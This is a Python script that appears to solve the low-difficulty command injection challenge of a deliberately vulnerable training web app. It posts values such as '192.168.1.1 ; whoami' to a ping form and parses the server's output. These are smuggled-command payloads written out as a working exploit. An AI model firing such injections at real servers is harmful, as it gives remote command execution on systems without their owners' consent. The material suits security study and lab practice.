#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

from conf import BASE_URL
from util import http_post

# The objective is to found the user running the webserver as well as
# the hostname of the machine through an RCE.

# -----------------------

# In this challenge we have a form which we can use to ping an arbitrary IP address.
#
# In particular we can send an HTTP POST request at the endpoint
# '/vulnerabilities/exec/' with the data
#
# ip=192.168.1.1&Submit=Submit
#
# The vulnerability is to be found on the fact that we can inject an
# arbitrary command to be executed on the remote server. For example,
# we can inject our commands as follows
#
# 192.168.1.1+%3B+whoami+%3B+hostname
#

# -----------------------

PAYLOADS = {
    "whoami": '192.168.1.1 ; echo -n "whoami: " ; whoami',
    "hostname": '192.168.1.1 ; echo -n "hostname: " ; hostname',
}

DIFFICULTY = "low"

def command_injection_low():
    global DIFFICULTY 

    print("========================================")
    print(f"[INFO] - COMMAND INJECTION {DIFFICULTY}")
    
    for cmd in PAYLOADS:
        payload = PAYLOADS[cmd]
        r = rce(payload)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})
    
        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                text = elem.text
                cmd_output = text[text.find(cmd) + len(cmd) + 1:].strip()                
                print(f"{cmd} = {cmd_output}")

# -----------------------
                
# executes command and return output from webserver
def rce(payload):
    global BASE_URL, DIFFICULTY    
    URL = BASE_URL + "/vulnerabilities/exec/"
    data = f"ip={payload}&Submit=Submit"
    return http_post(URL, DIFFICULTY, data=data)
